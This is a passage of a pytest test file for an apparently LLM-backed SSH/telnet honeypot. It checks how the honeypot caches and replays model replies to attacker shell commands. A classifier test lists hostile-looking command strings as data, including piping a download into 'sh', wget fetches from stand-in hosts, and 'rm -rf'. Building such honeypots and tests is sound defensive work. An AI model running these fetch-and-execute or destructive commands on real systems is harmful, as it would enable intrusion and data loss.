"""Learned replies (agents/learned.py) and their place in the persona reply path."""

from __future__ import annotations

import json
import os
import stat
import subprocess
import sys
from configparser import ConfigParser
from pathlib import Path
from types import SimpleNamespace

import pytest

from agents import hooks, learned
from agents.budget import Budget, BudgetConfig
from agents.learned import LearnedStore

ROOT = Path(__file__).resolve().parents[1]
PROMPT = "root@srv01:~# "
FP = learned.digest("fp")


def hexrun(seed: int, n: int = 20) -> str:
    """A random-looking hex run, built at runtime."""
    return learned.digest("hex", str(seed))[: n] if n <= 16 else \
        (learned.digest("hex", str(seed)) + learned.digest("hex2", str(seed)))[:n]


def b64run(seed: int) -> str:
    import base64
    import hashlib

    return base64.b64encode(hashlib.sha256(str(seed).encode()).digest()).decode()[:24] \
        .replace("/", "A").replace("+", "B") + "Zz9"


def observe(store, command, reply, *, session, net, history, fp=FP, user="root",
            interactive=True):
    return store.record(fp, user, interactive, command, reply, session=session, net=net,
                        history=history)


def promote_values(store, command, reply, seeds):
    """Three sessions, two networks, two histories, a different token value each:
    ``command`` and ``reply`` are format strings over ``{t}``."""
    for i, ((net, hist), seed) in enumerate(zip(
            [("192.0.2.0/24", "a" * 16), ("198.51.100.0/24", "b" * 16),
             ("192.0.2.0/24", "b" * 16)], seeds)):
        t = hexrun(seed)
        observe(store, command.format(t=t), reply.format(t=t), session=f"v{i}", net=net,
                history=hist)


def promote(store, command, reply, **kw):
    """Three sessions, two networks, two histories."""
    for i, (net, hist) in enumerate([("192.0.2.0/24", "a" * 16), ("198.51.100.0/24", "b" * 16),
                                     ("192.0.2.0/24", "b" * 16)]):
        observe(store, command, reply, session=f"s{i}", net=net, history=hist, **kw)


@pytest.fixture
def store(tmp_path):
    return LearnedStore(str(tmp_path / learned.FILE_NAME))


# ---- templates --------------------------------------------------------------------------

def test_random_tokens_become_numbered_placeholders():
    h, u = hexrun(1), "123e4567-e89b-42d3-a456-4266141740ab"
    t = learned.command_template(f"echo {h} {u} {h}")
    assert t.text == "echo \x000\x00 \x001\x00 \x000\x00" and t.values == (h, u)
    b = b64run(2)
    assert learned.command_template(f"echo {b}|base64 -d").values == (b,)


@pytest.mark.parametrize("line", [
    "cat /proc/cpuinfo", "ls -la /usr/lib/x86_64-linux-gnu", "uname -a",
    "echo 1700000000", "cat /etc/passwd", "grep -c processor /proc/cpuinfo",
    "echo abcdefghijklmnopqrstuvwxyz",  # long but one case, no digits
])
def test_ordinary_words_and_paths_are_not_tokens(line):
    t = learned.command_template(line)
    assert t is not None and t.values == () and t.text == line


def test_distinct_values_make_distinct_templates():
    h1, h2 = hexrun(1), hexrun(2)
    same = learned.command_template(f"x {h1} {h1}").text
    diff = learned.command_template(f"x {h1} {h2}").text
    assert same != diff


def test_reply_template_uses_verbatim_values_only():
    h = hexrun(3)
    assert learned.reply_template(f"cat: /tmp/{h}: No such file\r\n", (h,)) == \
        "cat: /tmp/\x000\x00: No such file\r\n"
    assert learned.reply_template(f"{h.upper()}\r\n", (h,)) is None       # case changed
    assert learned.reply_template(f"{h[2:12]}\r\n", (h,)) is None         # a piece of it
    other = hexrun(4)
    assert learned.reply_template(f"{other}\r\n", (h,)) is None           # computed value
    assert learned.reply_template("plain\r\n", ()) == "plain\r\n"


def test_reply_holding_a_decoding_of_the_token_is_not_learned():
    import base64

    word = base64.b64encode(b"Hello Decoy 2024 marker!").decode()
    assert learned.command_template(f"echo {word} | base64 -d").values == (word,)
    assert learned.reply_template("Hello Decoy 2024 marker!\r\n", (word,)) is None


def test_fill_substitutes_and_refuses_unknown_placeholders():
    assert learned.fill("a \x000\x00 b", ("v",)) == "a v b"
    assert learned.fill("a \x001\x00", ("v",)) is None


@pytest.mark.parametrize("line,changes", [
    ("uname -a", False), ("cat /proc/cpuinfo 2>/dev/null | grep name", False),
    ("ls -la >/dev/null 2>&1", False), ("/bin/busybox ECCHI", False),
    ("cd /tmp", True), ("echo x > /tmp/f", True), ("A=1", True),
    ("sudo -u root rm -rf /x", True), ("wget http://192.0.2.1/x", True),
    ("chmod +x x; ./x", True), ("/tmp/.x/run", True), ("busybox wget http://x", True),
    ("curl -s http://x | sh", True), ("export PATH=/x", True),
    ("find /tmp -type f", False), ("find /tmp -type f -delete", True),
    ("find / -name x -exec rm {} \\;", True), ("sudo find /tmp -delete", True),
    ("sort /etc/passwd", False), ("sort -o /tmp/s /etc/passwd", True), ("date", False),
    ("date -s 2020-01-01", True), ("env /usr/bin/unlink /tmp/marker", True),
    ("timeout 5 /opt/tool/run", True), ("sudo /bin/cat /etc/issue", False),
    ("unlink /tmp/marker", True), ("env A=1 id", True), ("nice -n 5 uname -a", False),
    ("c\\d /tmp", True), ("c'd' /tmp", True), ('"r"m -f x', True), ("su\\do r\\m x", True),
    ("ec'h'o hi", False), ('"/tmp/c\'at" x', True), ("/tmp/c\\at x", True),
    ('cat "/etc/issue"', False),
])
def test_may_change_state(line, changes):
    assert learned.may_change_state(line) is changes


# ---- promotion, varying, caps -------------------------------------------------------------

def test_served_only_after_sessions_networks_and_histories(store):
    for i, net, hist in [(0, "192.0.2.0/24", "a" * 16), (1, "192.0.2.0/24", "b" * 16)]:
        observe(store, "mystery", "out\r\n", session=f"s{i}", net=net, history=hist)
    assert store.lookup(FP, "root", True, "mystery") is None        # 2 sessions, 1 net
    observe(store, "mystery", "out\r\n", session="s2", net="198.51.100.0/24", history="a" * 16)
    found = store.lookup(FP, "root", True, "mystery")
    eid, reply = found.entry, found.reply
    assert reply == "out\r\n" and learned.valid_id(eid)
    assert store.lookup(FP, "root", False, "mystery") is None       # exec is its own entry
    assert store.lookup(FP, "admin", True, "mystery") is None


def test_one_history_is_not_enough(store):
    for i, net in enumerate(["192.0.2.0/24", "198.51.100.0/24", "192.0.2.0/24"]):
        observe(store, "mystery", "out\r\n", session=f"s{i}", net=net, history="a" * 16)
    assert store.lookup(FP, "root", True, "mystery") is None


def test_first_command_evidence_serves_first_commands_only(store):
    for i, net in enumerate(["192.0.2.0/24", "198.51.100.0/24", "192.0.2.0/24"]):
        observe(store, "mystery", "out\r\n", session=f"s{i}", net=net, history=learned.START)
    assert store.lookup(FP, "root", True, "mystery", history=learned.START) is not None
    assert store.lookup(FP, "root", True, "mystery", history="a" * 16) is None
    assert store.lookup(FP, "root", True, "mystery") is None


def test_an_observed_reply_that_cannot_be_stored_marks_the_entry_varying(store):
    promote(store, "mystery", "out\r\n")
    observe(store, "mystery", None, session="s9", net="192.0.2.0/24", history="c" * 16)
    assert store.lookup(FP, "root", True, "mystery") is None
    assert store.entries()[0]["varying"]


def test_the_same_session_counts_once(store):
    for net, hist in [("192.0.2.0/24", "a" * 16), ("198.51.100.0/24", "b" * 16)] * 2:
        observe(store, "mystery", "out\r\n", session="one", net=net, history=hist)
    assert store.lookup(FP, "root", True, "mystery") is None


def test_a_different_reply_marks_the_entry_varying_for_good(store):
    promote(store, "date-ish", "one\r\n")
    assert store.lookup(FP, "root", True, "date-ish") is not None
    observe(store, "date-ish", "two\r\n", session="s9", net="192.0.2.0/24", history="c" * 16)
    assert store.lookup(FP, "root", True, "date-ish") is None
    promote(store, "date-ish", "one\r\n")
    assert store.lookup(FP, "root", True, "date-ish") is None
    [entry] = store.entries()
    assert entry["varying"] and entry["reply"] is None


def test_placeholders_are_filled_with_the_new_values(store):
    promote_values(store, "cat /tmp/{t}", "cat: /tmp/{t}: No such file or directory\r\n",
                   (10, 12, 13))
    h2 = hexrun(11)
    reply = store.lookup(FP, "root", True, f"cat /tmp/{h2}").reply
    assert reply == f"cat: /tmp/{h2}: No such file or directory\r\n"


def test_teachers_with_one_token_value_serve_only_that_value_by_either_rule(store):
    h1 = hexrun(14)
    promote(store, f"file /tmp/{h1}", f"/tmp/{h1}\r\n")     # every teacher used h1
    assert store.lookup(FP, "root", True, f"file /tmp/{hexrun(15)}") is None
    assert store.lookup(FP, "root", True, f"file /tmp/{h1}").reply == f"/tmp/{h1}\r\n"


def test_a_changed_host_fingerprint_never_serves_the_old_answer(store):
    promote(store, "mystery", "out\r\n")
    assert store.lookup(learned.digest("other host"), "root", True, "mystery") is None


def test_unlearnable_asks_are_counted_but_never_served(store):
    for i in range(5):
        observe(store, "odd", None, session=f"s{i}", net=f"192.0.{i}.0/24", history="a" * 16)
    assert store.lookup(FP, "root", True, "odd") is None
    [entry] = store.entries()
    assert entry["asked"] == 5 and len(entry["nets"]) == 5 and entry["obs"] == []


def test_entries_are_capped_and_unserved_ones_go_first(tmp_path):
    clock = iter(range(1000, 2000))
    store = LearnedStore(str(tmp_path / "l.json"), max_entries=3, clock=lambda: next(clock))
    promote(store, "keep-me", "k\r\n")
    for i in range(6):
        observe(store, f"filler-{i}", "f\r\n", session="x", net="192.0.2.0/24", history="a" * 16)
    commands = {e["command"] for e in store.entries()}
    assert len(commands) == 3 and "keep-me" in commands and "filler-5" in commands
    assert "filler-0" not in commands


def test_observations_are_capped_without_losing_the_promoting_ones(store):
    promote(store, "mystery", "out\r\n")
    for i in range(learned.MAX_OBSERVATIONS * 2):
        observe(store, "mystery", "out\r\n", session=f"more{i}", net="192.0.2.0/24",
                history="d" * 16)
    [entry] = store.entries()
    assert len(entry["obs"]) == learned.MAX_OBSERVATIONS
    assert store.lookup(FP, "root", True, "mystery") is not None


def test_file_is_owner_only_and_reloaded_by_another_store(tmp_path):
    path = str(tmp_path / learned.FILE_NAME)
    a, b = LearnedStore(path), LearnedStore(path)
    promote(a, "mystery", "out\r\n")
    assert stat.S_IMODE(os.stat(path).st_mode) == 0o600
    assert b.lookup(FP, "root", True, "mystery") is not None
    assert a.forget(store_id(a)) and b.lookup(FP, "root", True, "mystery") is None


def store_id(store):
    return store.entries()[0]["id"]


def test_served_counts_are_written_in_batches(tmp_path):
    path = str(tmp_path / learned.FILE_NAME)
    store = LearnedStore(path)
    promote(store, "mystery", "out\r\n")
    eid = store_id(store)
    for _ in range(learned.FLUSH_SERVES):
        store.served(eid)
    assert LearnedStore(path).entries()[0]["served"] == learned.FLUSH_SERVES


def test_malformed_or_tampered_entries_are_dropped_on_read(tmp_path):
    path = tmp_path / learned.FILE_NAME
    path.write_text("{not json")
    assert LearnedStore(str(path)).entries() == []
    good = LearnedStore(str(tmp_path / "good.json"))
    promote(good, "mystery", "out\r\n")
    head, line = (tmp_path / "good.json").read_text().splitlines()
    entry = json.loads(line)
    bad = [dict(entry, reply="ok\x1b[2J"), dict(entry, reply="x \x003\x00"),
           dict(entry, command="y" * 2000), dict(entry, fp="nothex"),
           dict(entry, obs=[["zz", "n", "q"]]), dict(entry, asked=-1),
           dict(entry, vals=["nothex"]), dict(entry, shape=None), dict(entry, shape=0),
           dict(entry, shape="20x")]
    path.write_text("\n".join([head, *(json.dumps(b) for b in bad), "{broken",
                               json.dumps(entry)]) + "\n")
    entries = LearnedStore(str(path)).entries()
    assert len(entries) == 1 and entries[0]["reply"] == "out\r\n"
    path.write_text('{"version": 1}\n' + json.dumps(entry) + "\n")   # unknown format
    assert LearnedStore(str(path)).entries() == []


def test_memory_only_store_writes_nothing(tmp_path):
    store = LearnedStore(None)
    promote(store, "mystery", "out\r\n")
    assert store.lookup(FP, "root", True, "mystery") is not None
    assert list(tmp_path.iterdir()) == []


_WORKER = """
import sys
from agents.learned import LearnedStore, digest
store = LearnedStore(sys.argv[1], max_entries=5000, background=True, queue_size=1000)
for i in range(int(sys.argv[3])):
    store.record(digest("fp"), "root", True, f"cmd-{sys.argv[2]}-{i}", "out\\r\\n",
                 session=f"s{i}", net="192.0.2.0/24", history="a" * 16)
store.close()
assert store.dropped == 0
"""


def test_two_processes_share_the_file_under_the_lock(tmp_path):
    path = str(tmp_path / learned.FILE_NAME)
    env = dict(os.environ, PYTHONPATH=str(ROOT))
    procs = [subprocess.Popen([sys.executable, "-c", _WORKER, path, name, "40"], env=env,
                              cwd=str(tmp_path))
             for name in ("ssh", "telnet")]
    assert all(p.wait(timeout=120) == 0 for p in procs)
    commands = {e["command"] for e in LearnedStore(path).entries()}
    assert len(commands) == 80


# ---- pathological input ---------------------------------------------------------------------

def test_huge_command_is_neither_learned_nor_looked_up(store):
    line = "echo " + "a" * (learned.MAX_COMMAND_CHARS + 1)
    assert observe(store, line, "x\r\n", session="s", net="n", history="a" * 16) is None
    assert store.lookup(FP, "root", True, line) is None and store.entries() == []


def test_binary_or_oversized_reply_is_not_learned(store):
    promote(store, "bin", "ELF\x00\x01\x02\r\n")
    promote(store, "esc", "\x1b]0;title\x07\r\n")
    promote(store, "big", "x" * (learned.MAX_REPLY_BYTES + 1))
    assert all(store.lookup(FP, "root", True, c) is None for c in ("bin", "esc", "big"))
    assert all(e["reply"] is None for e in store.entries())


def test_marker_in_input_cannot_forge_a_placeholder(store):
    h = hexrun(20)
    promote(store, f"cat {h}", f"{h}\r\n")
    forged = "cat \x000\x00"
    assert learned.command_template(forged) is None
    assert store.lookup(FP, "root", True, forged) is None
    assert observe(store, "id", "\x000\x00\r\n", session="s", net="n", history="a" * 16)
    assert next(e for e in store.entries() if e["command"] == "id")["reply"] is None


def test_too_many_tokens_and_many_placeholders_do_not_collide(store):
    values = [hexrun(30 + i) for i in range(learned.MAX_TOKENS + 1)]
    assert learned.command_template("x " + " ".join(values)) is None
    ten = learned.command_template("x " + " ".join(values[:learned.MAX_TOKENS]))
    assert learned.reply_template(values[7] + "\r\n", ten.values) == "\x007\x00\r\n"
    assert learned.fill("\x007\x00 \x001\x00", ten.values) == values[7] + " " + values[1]
    # Two different tokens in one reply: their order may follow their values (``ls``).
    assert learned.reply_template(values[1] + " " + values[0], ten.values) is None


def test_a_command_built_to_share_another_template_gets_only_its_own_values(store):
    h1, h2 = hexrun(40), hexrun(41)
    promote_values(store, "file /tmp/{t}", "/tmp/{t}\r\n", (40, 42, 43))
    # Same template, a different random marker: the reply names the new marker only.
    reply = store.lookup(FP, "root", True, f"file /tmp/{h2}").reply
    assert reply == f"/tmp/{h2}\r\n"
    # A different command whose text spells the first template's tokens is its own entry.
    assert store.lookup(FP, "root", True, f"file /tmp/{h1} extra") is None


# ---- reply path ---------------------------------------------------------------------------

class _History:
    """Stands in for RunnableWithMessageHistory: replies by input line, stores each turn."""

    def __init__(self, replies: dict):
        self.replies = replies
        self.asked: list[str] = []
        self.store: dict = {}

    def get_session_history(self, session_id):
        from langchain_core.chat_history import InMemoryChatMessageHistory

        return self.store.setdefault(session_id, InMemoryChatMessageHistory())

    async def ainvoke(self, payload, config=None):
        from langchain_core.messages import AIMessage

        text = payload["messages"][-1].content
        self.asked.append(text)
        reply = self.replies.get(text, "-bash: " + text + ": command not found\r\n" + PROMPT)
        sid = config["configurable"]["session_id"]
        self.get_session_history(sid).add_messages([payload["messages"][-1],
                                                    AIMessage(content=reply)])
        return SimpleNamespace(content=reply, usage_metadata={"total_tokens": 100})


class _Logger:
    def __init__(self):
        self.events = []

    def info(self, message, extra=None):
        self.events.append((message, dict(extra or {})))


@pytest.fixture
def wired(tmp_path):
    budget = Budget(BudgetConfig(state_file=str(tmp_path / "budget.json")))
    hooks.set_budget(budget)
    hooks.set_local_replies(False)
    store = LearnedStore(learned.path_beside(budget.config.state_file), background=True)
    hooks.set_learned(store, "model-a")
    history = _History({"": PROMPT, "mystery": "mystery output\r\n" + PROMPT,
                        "cd /tmp": "root@srv01:/tmp# "})
    return SimpleNamespace(budget=budget, store=store, history=history, logger=_Logger())


async def _session(w, sid, ip, lines, interactive=True):
    assert hooks.session_open(sid, ip) is None
    out = []
    try:
        cfg = {"configurable": {"session_id": sid}}
        if interactive:
            await hooks.persona_invoke(w.history, session_id=sid, src_ip=ip, username="root",
                                       text="", interactive=True, llm_config=cfg,
                                       counts_as_command=False, logger=w.logger, log_extra={})
        for line in lines:
            out.append(await hooks.persona_invoke(
                w.history, session_id=sid, src_ip=ip, username="root", text=line,
                interactive=interactive, llm_config=cfg, logger=w.logger, log_extra={}))
        return out, w.budget.model_commands(sid), w.budget.learned_commands(sid)
    finally:
        hooks.session_close(sid)
        if hooks.learned_replies() is not None:
            hooks.learned_replies().flush()      # the worker's writes, for the next step


async def _teach(w, line="mystery"):
    await _session(w, "a1", "192.0.2.10", ["whoami", line])
    await _session(w, "a2", "198.51.100.20", ["id", line])
    await _session(w, "a3", "192.0.2.30", [line])


async def test_third_session_teaches_and_the_next_gets_no_model_call(wired):
    await _teach(wired)
    asked = len(wired.history.asked)
    out, model, learned_count = await _session(wired, "b1", "198.51.100.40", ["mystery"])
    assert wired.history.asked[asked:] == []    # the opener is learned too (same history)
    assert out[0].content == "mystery output\r\n" + PROMPT
    assert out[0].reply_step == "learned" and model == 0 and learned_count == 1
    messages = [m for m, _ in wired.logger.events]
    assert "Learned reply" in messages
    turns = wired.history.store["b1"].messages
    assert turns[-1].content == "mystery output\r\n" + PROMPT


async def test_learned_reply_ends_with_the_sessions_own_prompt(wired):
    await _teach(wired)
    hooks._session_prompts.clear()
    assert hooks.session_open("b2", "198.51.100.41") is None
    hooks._track(hooks._session_prompts, "b2", ("[root@srv01 ~]# ", "/root"))
    r = await hooks.persona_invoke(
        wired.history, session_id="b2", src_ip="198.51.100.41", username="root",
        text="mystery", interactive=True, llm_config={"configurable": {"session_id": "b2"}})
    assert r.content == "mystery output\r\n[root@srv01 ~]# " and r.reply_step == "learned"


async def test_a_session_that_changed_state_is_not_served(wired):
    await _teach(wired)
    asked = len(wired.history.asked)
    out, _, learned_count = await _session(wired, "b3", "198.51.100.42", ["cd /tmp", "mystery"])
    assert wired.history.asked[asked:] == ["cd /tmp", "mystery"]
    assert out[1].reply_step == "model" and learned_count == 0


async def test_a_reply_that_moves_the_prompt_is_not_learned(wired):
    for sid, ip, first in [("c1", "192.0.2.1", "id"), ("c2", "198.51.100.2", "whoami"),
                           ("c3", "192.0.2.3", "w")]:
        await _session(wired, sid, ip, [first, "cd /tmp"])
    assert all(e["reply"] is None for e in wired.store.entries() if e["command"] == "cd /tmp")


async def test_single_command_exec_sessions_learn_and_serve(wired):
    """SSH exec sessions run one command each, so every observation is a first command."""
    wired.history.replies["mystery"] = "mystery output\n"   # exec replies end without a prompt
    for sid, ip in [("e1", "192.0.2.1"), ("e2", "198.51.100.2"), ("e3", "192.0.2.3")]:
        await _session(wired, sid, ip, ["mystery"], interactive=False)
    out, model, _ = await _session(wired, "e4", "198.51.100.9", ["mystery"], interactive=False)
    assert out[0].reply_step == "learned" and out[0].content == "mystery output\n"
    assert model == 0
    # Not served later in a session: first-command evidence holds only for first commands.
    out, _, _ = await _session(wired, "e5", "198.51.100.9", ["id", "mystery"], interactive=False)
    assert out[1].reply_step == "model"
    out, _, _ = await _session(wired, "i1", "198.51.100.10", ["mystery"])
    assert out[0].reply_step == "model"     # the interactive entry is its own


async def test_first_interactive_command_is_served_from_first_command_evidence(wired):
    for sid, ip in [("f1", "192.0.2.1"), ("f2", "198.51.100.2"), ("f3", "192.0.2.3")]:
        await _session(wired, sid, ip, ["mystery"])
    out, model, _ = await _session(wired, "f4", "198.51.100.9", ["mystery"])
    assert out[0].reply_step == "learned" and model == 0


async def test_a_retried_reply_is_not_observed(wired):
    hooks.set_persona_retries(1)
    wired.history.replies["broken"] = "As an AI, I cannot run commands.\r\n" + PROMPT
    await _teach(wired, "broken")
    entry = next(e for e in wired.store.entries() if e["command"] == "broken")
    assert entry["reply"] is None and entry["asked"] == 3 and not entry["varying"]


async def test_a_reply_naming_the_source_address_is_not_observed(wired):
    wired.history.replies["lastx"] = "root pts/0 192.0.2.10\r\n" + PROMPT
    await _session(wired, "a1", "192.0.2.10", ["lastx"])
    entry = next(e for e in wired.store.entries() if e["command"] == "lastx")
    assert entry["obs"] == [] and entry["varying"]


async def test_a_planted_token_source_never_uses_the_store(wired, monkeypatch):
    await _teach(wired)
    monkeypatch.setattr(hooks, "_cacheable_source", lambda ip: ip != "198.51.100.77")
    out, _, learned_count = await _session(wired, "p1", "198.51.100.77", ["mystery"])
    assert out[0].reply_step == "model" and learned_count == 0


async def test_store_off_asks_the_model_and_writes_nothing(wired, tmp_path):
    hooks.set_learned(None)
    await _teach(wired)
    out, model, _ = await _session(wired, "b1", "198.51.100.40", ["mystery"])
    assert out[0].reply_step == "model" and model == 1
    assert not (tmp_path / learned.FILE_NAME).exists()


async def test_a_changed_model_or_scenario_starts_over(wired):
    await _teach(wired)
    hooks.set_learned(wired.store, "model-b")
    out, _, _ = await _session(wired, "b1", "198.51.100.40", ["mystery"])
    assert out[0].reply_step == "model"


def test_config_keys_and_defaults(tmp_path):
    cp = ConfigParser()
    assert hooks.learned_settings(cp) == (True, 3, 2000)
    cp.read_string("[llm]\nlearned_replies = false\n")
    assert hooks.learned_store(cp, str(tmp_path / "budget.json")) is None
    cp.read_string("[llm]\nlearned_replies = true\nlearned_min_sessions = 4\n"
                   "learned_max_entries = 99999\n")
    assert hooks.learned_settings(cp) == (True, 4, learned.MAX_ENTRIES_LIMIT)
    for bad in ("learned_min_sessions = 1", "learned_max_entries = 0"):
        cp = ConfigParser()
        cp.read_string(f"[llm]\n{bad}\n")
        with pytest.raises(ValueError):
            hooks.learned_settings(cp)


def test_init_runtime_with_the_store_off_reads_and_writes_no_file(tmp_path):
    cp = ConfigParser()
    cp.read_string(f"[llm]\nlearned_replies = false\n[budget]\nstate_file = "
                   f"{tmp_path / 'budget.json'}\n")
    hooks.init_runtime(cp, None, str(tmp_path), data_dir=str(tmp_path))
    assert hooks.learned_replies() is None
    assert not (tmp_path / learned.FILE_NAME).exists()


async def test_a_changed_persona_prompt_starts_over(wired):
    await _teach(wired)
    hooks.note_persona_prompts("system", "a different persona prompt")
    out, _, _ = await _session(wired, "b1", "198.51.100.40", ["mystery"])
    assert out[0].reply_step == "model"


def test_an_oversized_file_reads_as_empty_and_is_replaced(tmp_path, monkeypatch):
    path = tmp_path / learned.FILE_NAME
    path.write_bytes(b"x" * 100)
    monkeypatch.setattr(learned, "MAX_FILE_BYTES", 10)
    store = LearnedStore(str(path))
    assert store.entries() == [] and store.clear() == 0
    assert path.read_bytes().startswith(b"{")


def test_cli_reports_a_store_it_cannot_write(tmp_path, monkeypatch):
    monkeypatch.setattr(LearnedStore, "_transact", lambda self, change: False)
    assert "error" in _cli(tmp_path, "--clear")
    assert "error" in _cli(tmp_path, "--forget", "0" * 16)


def test_model_fingerprint_follows_model_and_prompt(tmp_path):
    a, b = ConfigParser(), ConfigParser()
    a.read_string("[llm]\nllm_provider = openai\nmodel_name = m1\nsystem_prompt = x\n")
    b.read_string("[llm]\nllm_provider = openai\nmodel_name = m2\nsystem_prompt = x\n")
    assert hooks.model_fingerprint(a, str(tmp_path)) != hooks.model_fingerprint(b, str(tmp_path))


def test_telnet_logs_a_learned_reply_and_the_step():
    from listeners import telnet

    seen = []
    conn = SimpleNamespace(emit=lambda *a, **k: seen.append((a, k)))
    resp = SimpleNamespace(learned_reply={"learned_id": "0" * 16}, reply_step="learned")
    telnet._note_cut(conn, "root", resp)
    assert [(a[1], k["data"]) for a, k in seen] == [("Learned reply", {"learned_id": "0" * 16})]
    assert telnet._step(resp) == {"step": "learned"}


# ---- operator command ---------------------------------------------------------------------

def _cli(tmp_path, *extra):
    from agents.__main__ import _run

    cfg = tmp_path / "config.ini"
    cfg.write_text(f"[budget]\nstate_file = {tmp_path / 'budget.json'}\n"
                   f"[honeypot]\nlog_file = {tmp_path / 'events.log'}\n")
    return _run(["learned", "--config", str(cfg), *extra])["learned"]


def test_cli_stats_list_candidates_forget_and_clear(tmp_path):
    store = LearnedStore(str(tmp_path / learned.FILE_NAME))
    promote(store, "mystery", "out\r\n")
    for i in range(4):
        observe(store, "wget\tevil \\x1b", None, session=f"w{i}",
                net=f"192.0.{i}.0/24", history="a" * 16)
    (tmp_path / "events.log").write_text("\n".join(json.dumps(r) for r in [
        {"message": "LLM response", "sensor_protocol": "ssh", "reply_step": "learned"},
        {"message": "LLM response", "sensor_protocol": "ssh", "reply_step": "model"},
        {"message": "LLM response", "sensor_protocol": "ssh", "reply_step": "opener"},
        {"message": "LLM response", "sensor_protocol": "ssh"},
        {"message": "Telnet input", "sensor_protocol": "telnet",
         "data": {"persona": True, "step": "local"}},
    ]) + "\n")
    stats = _cli(tmp_path, "--stats")
    assert stats["entries"] == 2 and stats["served_entries"] == 1
    assert stats["steps"] == {"learned": 1, "model": 1, "unknown": 1, "local": 1}
    listing = _cli(tmp_path, "--list")["text"]
    assert "wget\\tevil \\\\x1b" in listing
    cands = _cli(tmp_path, "--candidates")
    assert cands["candidates"] == 1 and "4" in cands["text"] and "\t" not in cands["text"]
    assert "error" in _cli(tmp_path, "--forget", "../../etc")
    eid = next(e["id"] for e in store.entries() if e["command"] == "mystery")
    assert _cli(tmp_path, "--forget", eid)["forgotten"] is True
    assert _cli(tmp_path, "--clear")["cleared"] == 1
    assert LearnedStore(str(tmp_path / learned.FILE_NAME)).entries() == []


def test_escape_bounds_and_escapes_text():
    out = learned.escape("a\\b\x00c‮" + "z" * 500, limit=40)
    assert len(out) <= 40 and "‮" not in out and out.endswith("...")


# ---- same-history rule ----------------------------------------------------------------------

SCRIPT = ["echo hello > /tmp/.x", "cat /tmp/.x", "cd /tmp", "ls -a", "cat .x"]
TMP = "root@srv01:/tmp# "
SCRIPT_REPLIES = {"": PROMPT, "echo hello > /tmp/.x": PROMPT, "cat /tmp/.x": "hello\r\n" + PROMPT,
                  "cd /tmp": TMP, "ls -a": ".  ..  .x\r\n" + TMP, "cat .x": "hello\r\n" + TMP}


async def test_a_script_is_answered_after_a_restart_with_no_model_request(wired, tmp_path):
    wired.history.replies.update(SCRIPT_REPLIES)
    for sid, ip in [("t1", "192.0.2.1"), ("t2", "198.51.100.2"), ("t3", "192.0.2.3")]:
        await _session(wired, sid, ip, SCRIPT)
    taught = len(wired.history.asked)
    assert taught == 3 * (len(SCRIPT) + 1)
    restarted = LearnedStore(wired.store.path, background=True)   # a new process
    restarted.preload()
    restarted.flush()
    hooks.set_learned(restarted, "model-a")
    out, model, learned_count = await _session(wired, "t4", "198.51.100.9", SCRIPT)
    assert wired.history.asked[taught:] == []
    assert [r.content for r in out] == [SCRIPT_REPLIES[line] for line in SCRIPT]
    assert all(r.reply_step == "learned" for r in out)
    assert model == 0 and learned_count == len(SCRIPT)
    rules = [e.get("learned_rule") for m, e in wired.logger.events if m == "Learned reply"]
    assert rules[-4:] == ["script"] * 4      # lines 2 to 5 follow the write: same history only
    # A session that differs at line 2 goes to the model from there on.
    forked = [SCRIPT[0], "cat /tmp/.y", *SCRIPT[2:]]
    out, _, _ = await _session(wired, "t5", "198.51.100.10", forked)
    assert out[0].reply_step == "learned"
    assert wired.history.asked[taught:] == forked[1:]


class _TokenHistory(_History):
    """Replies to ``cat /tmp/f`` with the token the session wrote."""

    def __init__(self, replies, transform=lambda t: t):
        super().__init__(replies)
        self.written: dict = {}
        self.transform = transform

    async def ainvoke(self, payload, config=None):
        text = payload["messages"][-1].content
        sid = config["configurable"]["session_id"]
        for m in self.get_session_history(sid).messages:   # served lines are in it too
            if str(m.content).startswith("echo ") and "> /tmp/f" in str(m.content):
                self.written[sid] = str(m.content).split()[1]
        if text.startswith("cat /tmp/f"):
            self.replies[text] = self.transform(self.written.get(sid, "")) + "\r\n" + PROMPT
        return await super().ainvoke(payload, config)


async def test_a_token_read_back_is_served_as_the_sessions_own(wired):
    wired.history = _TokenHistory({"": PROMPT})
    for n, (sid, ip) in enumerate([("k1", "192.0.2.1"), ("k2", "198.51.100.2"),
                                   ("k3", "192.0.2.3")]):
        await _session(wired, sid, ip, [f"echo {hexrun(60 + n)} > /tmp/f", "cat /tmp/f"])
    asked = len(wired.history.asked)
    fresh = hexrun(69)
    out, model, _ = await _session(wired, "k4", "198.51.100.9", [f"echo {fresh} > /tmp/f",
                                                                 "cat /tmp/f"])
    assert wired.history.asked[asked:] == []
    assert out[1].content == f"{fresh}\r\n" + PROMPT


async def test_teachers_with_one_token_value_serve_only_that_value(wired):
    """A reply may depend on a token in ways no trace check sees (here its length)."""
    wired.history = _TokenHistory({"": PROMPT}, transform=lambda t: str(len(t)))
    same = hexrun(60)
    for sid, ip in [("k1", "192.0.2.1"), ("k2", "198.51.100.2"), ("k3", "192.0.2.3")]:
        await _session(wired, sid, ip, [f"echo {same} > /tmp/f", "cat /tmp/f | wc -c"])
    out, _, _ = await _session(wired, "k4", "198.51.100.9", [f"echo {hexrun(61)} > /tmp/f",
                                                             "cat /tmp/f | wc -c"])
    assert out[1].reply_step == "model"
    out, _, _ = await _session(wired, "k5", "198.51.100.10", [f"echo {same} > /tmp/f",
                                                              "cat /tmp/f | wc -c"])
    # ``wc`` computes over what it reads, in a session with tokens: never by this rule.
    assert out[1].reply_step == "model"
    longer = hexrun(62, 30)
    script = learned.script_root(learned.digest("x"), "root", True)
    assert learned.script_step(script, f"echo {same}", "", (same,)) != \
        learned.script_step(script, f"echo {longer}", "", (longer,))


async def test_a_different_prompt_after_the_opener_is_not_served_by_the_script_rule(wired):
    wired.history.replies.update(SCRIPT_REPLIES)
    for sid, ip in [("t1", "192.0.2.1"), ("t2", "198.51.100.2"), ("t3", "192.0.2.3")]:
        await _session(wired, sid, ip, SCRIPT)
    wired.history.replies[""] = "Welcome\r\n[root@srv01 ~]# "      # another banner and prompt
    hooks.set_learned(LearnedStore(wired.store.path), "model-a")
    # The opener is served from the store; force the model's opener by forgetting it.
    opener = next(e["id"] for e in wired.store.entries() if e["command"] == "")
    LearnedStore(wired.store.path).forget(opener)
    out, _, _ = await _session(wired, "t9", "198.51.100.9", SCRIPT)
    assert [r.reply_step for r in out[1:]] == ["model"] * (len(SCRIPT) - 1)


async def test_a_token_read_back_transformed_is_never_served(wired):
    import base64

    word = base64.b64encode(b"Decoded marker text 77!").decode()
    wired.history = _TokenHistory({"": PROMPT}, transform=lambda t: base64.b64decode(t).decode())
